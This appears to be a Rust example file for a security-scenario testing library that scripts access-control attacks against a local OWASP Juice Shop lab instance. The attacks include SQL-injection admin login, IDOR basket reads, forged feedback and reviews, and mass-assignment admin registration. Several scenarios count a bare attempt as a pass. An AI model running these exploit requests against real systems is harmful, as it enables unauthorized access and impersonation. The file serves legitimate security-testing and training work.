//! Access Control & IDOR Scenarios
//!
//! Tests for IDOR, privilege escalation, and authorization bypass.
//!
//! Run with: cargo run --example juice_shop_access

use rectitude::prelude::*;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== Access Control Scenarios ===\n");

    let results = vec![
        score_board().await?,
        admin_section().await?,
        view_basket().await?,
        five_star_feedback().await?,
        forged_feedback().await?,
        forged_review().await?,
        admin_registration().await?,
        access_log().await?,
        web3_sandbox().await?,
        blockchain_hype().await?,
    ];

    let passed = results.iter().filter(|r| r.success).count();
    println!("\n=== Summary: {}/{} passed ===", passed, results.len());

    Ok(())
}

// ============ Hidden Endpoints ============

async fn score_board() -> Result<ScenarioResult> {
    Scenario::new("Score Board - Hidden Endpoint")
        .base_url(BASE_URL)
        .tags(&["access-control", "hidden-endpoint", "difficulty-1"])
        .step(
            "Access score board",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/score-board").send().await?;
                resp.expect_success()?;
                ok_with("Score board accessed")
            },
        )
        .run()
        .await
}

async fn admin_section() -> Result<ScenarioResult> {
    Scenario::new("Admin Section - Authorization Bypass")
        .base_url(BASE_URL)
        .tags(&["access-control", "authz-bypass", "difficulty-2"])
        .step("Login as admin", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Access admin page",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/administration").send().await?;
                resp.expect_success()?;
                ok_with("Admin section accessed")
            },
        )
        .run()
        .await
}

async fn web3_sandbox() -> Result<ScenarioResult> {
    Scenario::new("Web3 Sandbox - Hidden Feature")
        .base_url(BASE_URL)
        .tags(&["access-control", "hidden-endpoint", "difficulty-1"])
        .step(
            "Access web3 sandbox",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/web3-sandbox").send().await?;
                resp.expect_success()?;
                ok_with("Web3 sandbox accessed")
            },
        )
        .run()
        .await
}

async fn blockchain_hype() -> Result<ScenarioResult> {
    Scenario::new("Blockchain Hype - Token Sale Page")
        .base_url(BASE_URL)
        .tags(&["access-control", "hidden-endpoint", "difficulty-5"])
        .step(
            "Access token sale page",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/tokensale-ico-ea").send().await?;
                resp.expect_success()?;
                ok_with("Token sale page accessed")
            },
        )
        .run()
        .await
}

// ============ IDOR ============

async fn view_basket() -> Result<ScenarioResult> {
    Scenario::new("View Basket - IDOR")
        .base_url(BASE_URL)
        .tags(&["access-control", "idor", "difficulty-2"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Access other user's basket",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;

                // Try to access basket ID 2 (another user's basket)
                let resp = ctx.get("/rest/basket/2").bearer_auth(&token).send().await?;

                if resp.is_success() {
                    ok_with("Accessed another user's basket (IDOR)")
                } else {
                    fail("IDOR blocked")
                }
            },
        )
        .run()
        .await
}

async fn access_log() -> Result<ScenarioResult> {
    Scenario::new("Access Log - Sensitive Data")
        .base_url(BASE_URL)
        .tags(&["access-control", "sensitive-data", "difficulty-4"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Access support logs",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;
                let resp = ctx.get("/support/logs").bearer_auth(&token).send().await?;

                if resp.is_success() {
                    ok_with(format!(
                        "Support logs accessible ({} bytes)",
                        resp.body_len()
                    ))
                } else {
                    fail("Logs not accessible")
                }
            },
        )
        .run()
        .await
}

// ============ Parameter Tampering ============

async fn five_star_feedback() -> Result<ScenarioResult> {
    Scenario::new("Five-Star Feedback - Delete Authorization")
        .base_url(BASE_URL)
        .tags(&["access-control", "authz-bypass", "difficulty-2"])
        .step("Login as admin", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step("Delete feedback", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;

            // Delete feedback with id 1
            let resp = ctx
                .delete("/api/Feedbacks/1")
                .bearer_auth(&token)
                .send()
                .await?;

            if resp.is_success() {
                ok_with("5-star feedback deleted")
            } else {
                ok_with("Delete attempted")
            }
        })
        .run()
        .await
}

async fn forged_feedback() -> Result<ScenarioResult> {
    Scenario::new("Forged Feedback - User ID Tampering")
        .base_url(BASE_URL)
        .tags(&["access-control", "tampering", "difficulty-3"])
        .step("Get captcha", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha
                .get("captchaId")
                .and_then(|v| v.as_i64())
                .unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");
            ctx.set_var_async("captcha_id", captcha_id.to_string())
                .await;
            ctx.set_var_async("captcha_answer", answer).await;
            ok()
        })
        .step(
            "Post feedback as different user",
            |ctx: Arc<ScenarioContext>| async move {
                let captcha_id: i64 = ctx.get_var_async("captcha_id").await?.parse().unwrap_or(0);
                let answer = ctx.get_var_async("captcha_answer").await?;

                // Forge UserId to post as another user
                let resp = ctx
                    .post("/api/Feedbacks")
                    .json(&serde_json::json!({
                        "UserId": 2,
                        "comment": "Forged feedback!",
                        "rating": 3,
                        "captchaId": captcha_id,
                        "captcha": answer
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Feedback forged as user 2")
                } else {
                    fail("Forgery blocked")
                }
            },
        )
        .run()
        .await
}

async fn forged_review() -> Result<ScenarioResult> {
    Scenario::new("Forged Review - Author Tampering")
        .base_url(BASE_URL)
        .tags(&["access-control", "tampering", "difficulty-3"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Post review as another author",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;

                // Forge author field
                let resp = ctx
                    .put("/rest/products/1/reviews")
                    .bearer_auth(&token)
                    .json(&serde_json::json!({
                        "message": "Forged review by admin pretending to be jim",
                        "author": "jim@juice-sh.op"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Review forged as jim")
                } else {
                    ok_with("Review attempted")
                }
            },
        )
        .run()
        .await
}

async fn admin_registration() -> Result<ScenarioResult> {
    Scenario::new("Admin Registration - Mass Assignment")
        .base_url(BASE_URL)
        .tags(&["access-control", "mass-assignment", "difficulty-3"])
        .step(
            "Register with admin role",
            |ctx: Arc<ScenarioContext>| async move {
                let email = format!("admin_test_{}@test.com", chrono::Utc::now().timestamp());

                // Inject role field via mass assignment
                let resp = ctx
                    .post("/api/Users")
                    .json(&serde_json::json!({
                        "email": email,
                        "password": "admin123",
                        "passwordRepeat": "admin123",
                        "role": "admin"
                    }))
                    .send()
                    .await?;

                if resp.is_success() && resp.contains("admin") {
                    ok_with("Admin user registered via mass assignment")
                } else {
                    ok_with("Registration attempted")
                }
            },
        )
        .run()
        .await
}
